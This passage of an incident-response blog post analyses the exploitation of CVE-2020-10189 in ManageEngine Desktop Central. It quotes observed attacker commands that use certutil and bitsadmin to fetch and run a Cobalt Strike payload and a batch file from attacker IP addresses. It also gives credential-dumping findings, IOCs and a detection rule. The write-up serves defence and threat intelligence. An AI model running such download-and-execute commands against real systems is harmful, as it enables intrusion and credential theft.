<figcaption><span style="font-weight: bold;">Figure 10</span> - POC references to<span>&nbsp;</span><code>_chart</code><span>&nbsp;</span>and<span>&nbsp;</span><code>logger.zip</code>, reference:<span>&nbsp;</span><a href="https://srcincite.io/pocs/src-2020-0011.py.txt" target="_blank" rel="noopener">https://srcincite.io/pocs/src-2020-0011.py.txt</a></figcaption>
</figure>
<h2 id="command-and-control-payload-introduced-to-system">Command and Control Payload Introduced To System</h2>
<p>Subsequent process creation logs revealed<span>&nbsp;</span><code>cmd.exe</code><span>&nbsp;</span>and<span>&nbsp;</span><code>certutil.exe</code><span>&nbsp;</span>commands being used to download and execute<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>(Figure 11). Further analysis revealed a high likelihood of &nbsp;<code>2.exe</code><span>&nbsp;</span>being part of the popular post-exploitation and C2 tool Cobalt Strike.</p>
<pre class="line-numbers"><code class="language-shell">cmd /c certutil -urlcache -split -f http://91.208.184.78/2.exe &amp;&amp; 2.exe</code></pre>
<div>&nbsp;</div>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=588&amp;name=certutilzoho.png" alt="certutilzoho" width="588" loading="lazy" style="width: 588px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=294&amp;name=certutilzoho.png 294w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=588&amp;name=certutilzoho.png 588w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=882&amp;name=certutilzoho.png 882w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=1176&amp;name=certutilzoho.png 1176w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=1470&amp;name=certutilzoho.png 1470w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/certutilzoho.png?width=1764&amp;name=certutilzoho.png 1764w" sizes="(max-width: 588px) 100vw, 588px">
<figcaption><strong>Figure 11</strong> - Certutil commands&nbsp;</figcaption>
</figure>
<p>OSINT revealed that<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>was already identified as malware by several detection engines on VirusTotal:<span>&nbsp;</span><a href="https://www.virustotal.com/gui/file/d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67309/details" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67309/details</a></p>
<p>Leveraging app.any.run sandbox (Figure 12) and memory analysis of the malware further confirmed the likelihood of<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>being a hosted Cobalt Strike Beacon payload.</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=631&amp;height=168&amp;name=cobalt.png" alt="cobalt" width="631" height="168" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 631px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=316&amp;height=84&amp;name=cobalt.png 316w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=631&amp;height=168&amp;name=cobalt.png 631w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=947&amp;height=252&amp;name=cobalt.png 947w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=1262&amp;height=336&amp;name=cobalt.png 1262w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=1578&amp;height=420&amp;name=cobalt.png 1578w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cobalt.png?width=1893&amp;height=504&amp;name=cobalt.png 1893w" sizes="(max-width: 631px) 100vw, 631px">
<figcaption><strong>Figure 12</strong> -<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>classified as Cobalt Strike Beacon</figcaption>
</figure>
<p><a href="https://any.run/report/d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67309/e65dd4ff-60c6-49a4-8e6d-94c6c80a74b6" target="_blank" rel="noopener">https://any.run/report/d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67309/e65dd4ff-60c6-49a4-8e6d-94c6c80a74b6</a></p>
<h3 id="yara-analysis-supports-2-exe-classification-as-cobalt-strike">YARA ANALYSIS SUPPORTS 2.EXE CLASSIFICATION AS COBALT STRIKE</h3>
<p>We performed a yara scan against all memory sections in use by the known malware,<span>&nbsp;</span><a href="https://blog.reconinfosec.com/p/f98991ee-0e11-4f43-9b5f-bd0bf7611a40/2.exe"><code>2.exe</code></a><span>&nbsp;</span>. The yara scan results further supported the theory of<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>resembling a Cobalt Strike beacon among several other possible malware signature hits (Figure 13).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=460&amp;name=yara-cobalt.png" alt="yara-cobalt" width="460" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 460px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=230&amp;name=yara-cobalt.png 230w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=460&amp;name=yara-cobalt.png 460w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=690&amp;name=yara-cobalt.png 690w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=920&amp;name=yara-cobalt.png 920w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=1150&amp;name=yara-cobalt.png 1150w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/yara-cobalt.png?width=1380&amp;name=yara-cobalt.png 1380w" sizes="(max-width: 460px) 100vw, 460px">
<figcaption style="padding-left: 80px;"><strong>Figure 13</strong> - Yarascan results</figcaption>
</figure>
<p>Leveraging Volatilityâ€™s malfind plugin, we identified several memory sections with potential signs of code injection. &nbsp;We fired off another yara scan, this time against the memory sections dumped by malfind. This provided additional validation of the likely presence of a Cobalt Strike Beacon. See that entire process in the asciinema recording below (Figure 14).</p>
<center>
<div class="hs-embed-wrapper"><div class="hs-embed-content-wrapper"><a href="https://asciinema.org/a/308852" target="_blank" rel="noopener" data-mce-href="https://asciinema.org/a/308852" data-mce-fragment="1"><img src="https://asciinema.org/a/308852.svg" data-mce-src="https://asciinema.org/a/308852.svg" data-mce-fragment="1"></a></div></div>
<br><span style="font-weight: bold;">Figure 14</span> - Yarascan against malfind output</center>
<p>We then examined malfindâ€™s output for evidence of code injection and identified suspicious memory sections within<span>&nbsp;</span><code>svchost.exe</code><span>&nbsp;</span>(Figure 15). &nbsp;OSINT research led us to a researcher that had reversed the malware and found the area responsible for injecting code into<span>&nbsp;</span><code>svchost.exe</code><span>&nbsp;</span>(Figure 16). &nbsp;</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=631&amp;name=memforensics.png" alt="memforensics" width="631" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 631px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=316&amp;name=memforensics.png 316w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=631&amp;name=memforensics.png 631w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=947&amp;name=memforensics.png 947w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=1262&amp;name=memforensics.png 1262w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=1578&amp;name=memforensics.png 1578w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/memforensics.png?width=1893&amp;name=memforensics.png 1893w" sizes="(max-width: 631px) 100vw, 631px">
<figcaption><strong>Figure 15</strong> - Our analysis of svchost containing injected code</figcaption>
</figure>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=631&amp;name=vkintel.png" alt="vkintel" width="631" loading="lazy" style="width: 631px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=316&amp;name=vkintel.png 316w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=631&amp;name=vkintel.png 631w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=947&amp;name=vkintel.png 947w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=1262&amp;name=vkintel.png 1262w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=1578&amp;name=vkintel.png 1578w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/vkintel.png?width=1893&amp;name=vkintel.png 1893w" sizes="(max-width: 631px) 100vw, 631px">
<figcaption><strong>Figure 16</strong> - @VK_Intelâ€™s analysis showing likely inject function</figcaption>
</figure>
<p>Reference:</p>
<div><iframe id="twitter-widget-1" style="margin: 0px auto; display: block;" title="Twitter Tweet" xml="lang" src="https://platform.twitter.com/embed/Tweet.html?creatorScreenName=lukerecon&amp;dnt=false&amp;embedId=twitter-widget-1&amp;features=eyJ0ZndfZXhwZXJpbWVudHNfY29va2llX2V4cGlyYXRpb24iOnsiYnVja2V0IjoxMjA5NjAwLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X2hvcml6b25fdHdlZXRfZW1iZWRfOTU1NSI6eyJidWNrZXQiOiJodGUiLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X3NwYWNlX2NhcmQiOnsiYnVja2V0Ijoib2ZmIiwidmVyc2lvbiI6bnVsbH19&amp;frame=false&amp;hideCard=false&amp;hideThread=false&amp;id=1237079995442495490&amp;lang=en&amp;origin=https%3A%2F%2Fblog.reconinfosec.com%2Fanalysis-of-exploitation-cve-2020-10189%2F&amp;sessionId=dab2aeb3def45b99735eba7b02e02667984849a3&amp;siteScreenName=Recon_InfoSec&amp;theme=light&amp;widgetsVersion=75b3351%3A1642573356397&amp;width=550px" width="560" height="315" frameborder="0" scrolling="no" allowfullscreen data-tweet-id="1237079995442495490"></iframe></div>
<p>Among the post-compromise activities, we observed malicious Bitsadmin commands that contained instructions to transfer<span>&nbsp;</span><code>install.bat</code><span>&nbsp;</span>from<span>&nbsp;</span><code>66.42.96.220</code><span>&nbsp;</span>over suspicious port<span>&nbsp;</span><code>12345</code>.</p>
<p>Our analysts observed bitsadmin commands being run on the Desktop Central server which contained the same IP address, port and the same install.bat file called in the PowerShell download commands (Figure 17).</p>
<pre class="line-numbers"><code class="language-shell">cmd /c bitsadmin /transfer bbbb http://66.42.98.220:12345/test/install.bat C:\Users\Public\install.bat
</code></pre>
<div>&nbsp;</div>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=631&amp;name=bitsadmin.png" alt="bitsadmin" width="631" loading="lazy" style="width: 631px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=316&amp;name=bitsadmin.png 316w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=631&amp;name=bitsadmin.png 631w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=947&amp;name=bitsadmin.png 947w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=1262&amp;name=bitsadmin.png 1262w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=1578&amp;name=bitsadmin.png 1578w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/bitsadmin.png?width=1893&amp;name=bitsadmin.png 1893w" sizes="(max-width: 631px) 100vw, 631px">
<figcaption><strong>Figure 17</strong> - Bitsadmin commands</figcaption>
</figure>
<h2 id="credential-access">Credential Access</h2>
<p>We also observed potential credential access activity. A common technique for attackers to perform credential dumping is using a malicious process (SourceImage) to access another process (the TargetImage). Most commonly,<span>&nbsp;</span><code>lsass.exe</code><span>&nbsp;</span>is targeted as it often contains sensitive information such as account credentials.</p>
<p>Here, we observed the SourceImage<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>accessing the TargetImage<span>&nbsp;</span><code>lsass.exe</code><span>&nbsp;</span>(Figure 18). &nbsp;The Cobalt Strike Beacon contains native credential dumping capabilities similar to<span>&nbsp;</span><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa" target="_blank" rel="noopener">Mimikatz</a>. The only required condition to use this capability is SYSTEM privileges, which the attacker had. &nbsp;The event below provides sufficient evidence that the risk of credential access is high.</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=442&amp;name=cred-dumping.png" alt="cred-dumping" width="442" loading="lazy" style="width: 442px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=221&amp;name=cred-dumping.png 221w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=442&amp;name=cred-dumping.png 442w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=663&amp;name=cred-dumping.png 663w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=884&amp;name=cred-dumping.png 884w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=1105&amp;name=cred-dumping.png 1105w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/cred-dumping.png?width=1326&amp;name=cred-dumping.png 1326w" sizes="(max-width: 442px) 100vw, 442px">
<figcaption style="padding-left: 80px;"><strong>Figure 18</strong> -<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>accessing<span>&nbsp;</span><code>lsass.exe</code></figcaption>
</figure>
<h2 id="tools-for-ir-teams-dealing-with-similar-intrusions">Tools For IR Teams Dealing With Similar Intrusions</h2>
<p>During our analysis of this intrusion, we added a few collection targets to Eric Zimmerman's<span>&nbsp;</span><a href="https://learn.duffandphelps.com/kape" target="_blank" rel="noopener">KAPE</a><span>&nbsp;</span>tool to add the<span>&nbsp;</span><a href="https://github.com/EricZimmerman/KapeFiles/commit/c5ca95acd929bc3c6ab613e3e43d52504a478f03" target="_blank" rel="noopener">relevant logs</a><span>&nbsp;</span>to triage efforts.<span>&nbsp;</span><a href="https://binaryforay.blogspot.com/2019/02/introducing-kape.html" target="_blank" rel="noopener">Read more about KAPE</a>.</p>
<p>Example usage targeting relevant logs (tune for your use-case):</p>
<p><code>kape.exe --tsource C: --tdest c:\temp\tout --tflush --target ManageEngineLogs</code></p>
<h2 id="iocs">IOCs</h2>
<ul>
<li><code>Storesyncsvc.dll</code>
<ul>
<li>MD5:<span>&nbsp;</span><code>5909983db4d9023e4098e56361c96a6f</code></li>
<li>SHA256:<span>&nbsp;</span><code>f91f2a7e1944734371562f18b066f193605e07223aab90bd1e8925e23bbeaa1c</code></li>
</ul>
</li>
<li><code>Install.bat</code>
<ul>
<li>MD5:<span>&nbsp;</span><code>7966c2c546b71e800397a67f942858d0</code></li>
<li>SHA256:<span>&nbsp;</span><code>de9ef08a148305963accb8a64eb22117916aa42ab0eddf60ccb8850468a194fc</code></li>
</ul>
</li>
<li><code>2.exe</code>
<ul>
<li>MD5:<span>&nbsp;</span><code>3e856162c36b532925c8226b4ed3481c</code></li>
<li>SHA256:<span>&nbsp;</span><code>d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67309</code></li>
</ul>
</li>
<li><code>66[.]42[.]98[.]220</code></li>
<li><code>91[.]208[.]184[.]78</code></li>
<li><code>74[.]82[.]201[.]8</code></li>
</ul>
<h2 id="detection">Detection</h2>
<p>Florian Roth of the Sigma project has created a signature to detect some of the techniques leveraged by the attackers:</p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_10189.yml" target="_blank" rel="noopener">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_10189.yml</a></p>
<p>Our analysis of this attack also found that detection based on command-line activity in process creation logs would be valuable.</p>
<pre class="line-numbers"><code class="language-yaml">ParentImage | endswith: 
	'DesktopCentral_Server\jre\bin\java.exe'
CommandLine | contains: 
	'*powershell*'
	'*certutil*'
	'*bitsadmin*'
</code></pre>
<p><strong>[UPDATE]</strong><br><br>The researchers at Fireeye published an excellent article that contained some of the same findings and included attribution to APT41. You can read more about it here:<br><br><a href="https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html</a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p></span>
      </div>
      
        <div class="blog-post__tags">
          <span id="hs_cos_wrapper_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_icon" style="" data-hs-cos-general-type="widget" data-hs-cos-type="icon"><svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" aria-hidden="true"><g id="tag1_layer"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z" /></g></svg></span>
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/dfir" rel="tag">DFIR</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/incident-response" rel="tag">Incident Response</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/forensics" rel="tag">Forensics</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/secops" rel="tag">SecOps</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/infosec" rel="tag">InfoSec</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/defense" rel="tag">Defense</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/malware" rel="tag">Malware</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/exploit" rel="tag">Exploit</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/cve-2020-10189" rel="tag">CVE-2020-10189</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/intel-sharing" rel="tag">Intel Sharing</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/zoho" rel="tag">Zoho</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/vulnerability" rel="tag">Vulnerability</a>,
          
            <a class="blog-post__tag-link" href="https://blog.reconinfosec.com/tag/manageengine" rel="tag">ManageEngine</a>
          
        </div>
      
    </article>
    
  </div>

  

  

  

  
  
    
      <section class="blog-related-posts">
        <div class="content-wrapper">
          <h2>Read On</h2>
          <div class="blog-related-posts__list">
    
            <article class="blog-related-posts__post" aria-label="Blog post summary: Analysis of Exploitation: CVE-2019-3396">
              
              <div class="blog-related-posts__content">
                <h3 class="blog-related-posts__title">
                  <a class="blog-related-posts__title-link" href="https://blog.reconinfosec.com/analysis-of-exploitation-of-cve-2019-3396">Analysis of Exploitation: CVE-2019-3396</a></h3>
                <p>The Recon incident response team recently worked an intrusion case involving a Confluence web...</p>
              </div>
            </article>
      
  

  
    
            <article class="blog-related-posts__post" aria-label="Blog post summary: An Encounter with Ransomeware-as-a-Service: MEGAsync Analysis">
              
              <div class="blog-related-posts__content">
                <h3 class="blog-related-posts__title">
                  <a class="blog-related-posts__title-link" href="https://blog.reconinfosec.com/megasync-analysis">An Encounter with Ransomeware-as-a-Service: MEGAsync Analysis</a></h3>
                <p>Recon's SOC recently responded to an attempted ransomware and extortion attack. It had all the...</p>
              </div>
            </article>
      
  

  
    
            <article class="blog-related-posts__post" aria-label="Blog post summary: Emergence of Akira Ransomware Group">
              
                <a class="blog-related-posts__post-image-wrapper" href="https://blog.reconinfosec.com/emergence-of-akira-ransomware-group" aria-label="Read full post: Emergence of Akira Ransomware Group">
                  <img class="blog-related-posts__image" src="https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=352&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png" loading="lazy" width="352" alt="" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=176&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png 176w, https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=352&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png 352w, https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=528&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png 528w, https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=704&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png 704w, https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=880&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png 880w, https://blog.reconinfosec.com/hs-fs/hubfs/image-png-May-10-2023-07-09-43-2952-AM.png?width=1056&amp;name=image-png-May-10-2023-07-09-43-2952-AM.png 1056w" sizes="(max-width: 352px) 100vw, 352px">
                </a>
              
              <div class="blog-related-posts__content">
                <h3 class="blog-related-posts__title">
                  <a class="blog-related-posts__title-link" href="https://blog.reconinfosec.com/emergence-of-akira-ransomware-group">Emergence of Akira Ransomware Group</a></h3>
                <p>The Recon SOC recently worked an IR case involving the newly emerged Akira Ransomware Group. News...</p>
              </div>
            </article>
      
          </div>
        </div>
      </section>
    
  



</div>

      </main>

      
        <div data-global-resource-path="Recon - Freehive Theme/templates/partials/footer.html"><footer class="footer">
  <div class="container-fluid footer__container content-wrapper">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-1 dnd-section">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-cell dnd-column" style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-2 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1692989471823" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">

  
  
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1692989481468" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">

  
  
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 dnd-row footer-column-1-row-2-margin">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_footer-module-3" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-rich_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><span id="hs_cos_wrapper_footer-module-3_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="rich_text"><div style="text-align: center; font-size: 0.7rem;"><span>Â© 2025 All rights reserved. <a href="https://blog.reconinfosec.com/rss.xml" rel="noopener" target="_blank">RSS Feed</a></span></div></span></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div>
</div>
</div>
</footer></div>
      
    </div>
    
    
    
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/template_assets/131712521911/1692990323611/Recon_-_Freehive_Theme/js/main.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://7052064.fs1.hubspotusercontent-na1.net/hubfs/7052064/hub_generated/module_assets/1/-2712622/1741803613777/module_search_input.min.js"></script>
<script src="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/module_assets/131712522012/1692983522150/module_131712522012_menu.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/blog.reconinfosec.com\/analysis-of-exploitation-cve-2020-10189"]);
_hsq.push(["setPageId", "64795589556"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 64795589556,
    "legacyPageId": "64795589556",
    "contentFolderId": null,
    "contentGroupId": 26182611321,
    "abTestId": null,
    "languageVariantId": 64795589556,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/7101814.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "3cd97770-6984-425f-969c-ed1e4388501d",
    ticks: 1741855042418,
    page_id: 64795589556,
    
    content_group_id: 26182611321,
    portal_id: 7101814,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    
    analytics_page_id: "64795589556",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.432/js/index.js"></script>



<div id="fb-root"></div>
  <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v3.0";
  fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


  
</body></html>